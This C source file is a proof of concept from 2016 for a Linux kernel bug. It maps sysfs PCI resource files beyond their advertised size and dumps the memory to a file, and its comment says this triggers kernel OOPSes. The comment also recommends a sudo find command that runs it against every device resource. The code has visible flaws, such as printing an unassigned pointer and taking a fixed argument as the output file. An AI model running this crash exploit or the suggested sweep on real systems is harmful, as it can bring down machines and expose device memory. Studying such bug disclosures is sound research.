/*
 * 
 * pcimmap-ex - This used to be a tool called pciopen until I found this bug, now I simplified a POC,
 *              and named it this.
 *
 * (/sys) sysfs exports pci resourceN files where N is a number.  These files, if mmap(2)'d with a length longer than
 * the value they are advertising as their amount of memory (which is readable with lstat(2) on the resourceN file)
 * And subsequently having that extra area of memory dereferenced, will cause a kernel pagefault on a variety of devices.
 *
 * Recommended test run:  sudo find /sys/devices -name resource\? -exec ~/pcimmap-ex \{\} \;
 *            
 * - The memory is then subsequently dumped to an output file.
 * - Uses two syntaxes (either direct sysfs or getopt)
 * - Linux kernel OOPSs when mmap(2) a resourceN file with too many bytes
 * - The write(2) syscall is used to dereference the entire memory space (nbytes)...
 *   TODO: Check if the same behavior occurs with my own dereferences (read dereferences), if not, 
 *	   this might be specific to the write(2) syscall or syscall context behavior touch this memory.
 *         
 * 
 *    - JS 04/2016
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <sys/mman.h>

#define PAGE_SIZE        getpagesize()
#define ROUND_PAGE(x)    ((void *)(((unsigned long)(x)) & ~((unsigned long)(PAGE_SIZE - 1))))      

int main(int argc, char **argv)
{
        int             opt;
        unsigned        ctrlr, bus, lun, fn, resnum;
        int             fd, savefd;
        unsigned        nbytes = 0;
        char            *mem;
        char            *filename;
        char            pcidev[512];
        struct  stat    sb;

        if (argc < 3) {
                fprintf(stderr, "Usage: %s [-N nbytes] /sys/devices/pciXXXX:XX/path/resourceN outfile\n", argv[0]);
                fprintf(stderr, "Usage: %s [-N nbytes] [-c pcictlr] [-b pcibus] [-l pcilun] [-f pcifn] [-r pciresource] outfile\n", argv[0]);
                exit(1);
        }

        while ((opt = getopt(argc, argv, "N:c:b:l:f:r:")) != -1) switch(opt) {
                case 'N':
                        nbytes = strtoul(optarg, NULL, 0);
                        break;
                case 'c':
                        ctrlr = strtoul(optarg, NULL, 0);
                        break;
                case 'b':
                        bus = strtoul(optarg, NULL, 0);
                        break;
                case 'l':
                        lun = strtoul(optarg, NULL, 0);
                        break;
                case 'f':
                        fn = strtoul(optarg, NULL, 0);
                        break;
                case 'r':
                        resnum = strtoul(optarg, NULL, 0);
                        break;
        }

	if (optind > 0) 
		if (argv[optind][0] == '/') {
			strncpy(pcidev, argv[optind], 510);
			pcidev[511] = '\0';
		} else {
			snprintf(pcidev, sizeof(pcidev) - 1, "/sys/devices/pci%.4x:%.2x/%.4x:%.2x:%.2x.%.1x/resource%u",
					ctrlr, bus, ctrlr, bus, lun, fn, resnum);
			fprintf(stderr, "\n   Mapping PCI controller %.4hx @ bus %.2hhx @ lun %.2hhx @ function %.1hhx @ resource %u to path:\n",
					 ctrlr, bus, lun, fn, resnum);
			fprintf(stderr, "              %s\n", pcidev);   

		}

        if ((fd = open(pcidev, O_RDONLY)) < 0) {
                perror("open(2)");
                exit(1);
        }

        filename = argv[2];

        if (lstat(pcidev, &sb) != 0) {
                perror("lstat(2)");
                exit(1);
        }

        if (nbytes == 0) 
                nbytes = (unsigned)sb.st_size;

        fprintf(stderr, "\n"
                        "       Opened sysfs resource: %s.  File desc=%d\n", pcidev, fd);
        fprintf(stderr, "       Mmap(2) with PROT_READ and MAP_SHARED returns memory mapped file @ %p\n", mem);

	/*
	 * Map the resource into memory.
	 */
        if ((mem = mmap(0, (size_t)nbytes, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED) {
                perror("mmap(2)");
                exit(1);
        }

	/*
	 * Open the output file. 
	 */
        if ((savefd = open(filename, O_CREAT|O_WRONLY, 0600)) < 0) {
                perror("open(2)");
                exit(1);
        }
        fprintf(stderr, "       Opened output file: %s  Writing %zu bytes.\n", filename, (size_t)nbytes);

        if (write(savefd, mem, (size_t)nbytes) <= 0) {
                perror("write(2)");
                close(savefd);
                close(fd);
                exit(1);
        }

        fprintf(stderr, "       Using munmap(2) to relinquish PCI resource memory.\n");
        (void) munmap(mem, (size_t)nbytes);
 
        close(fd);
        close(savefd);
}
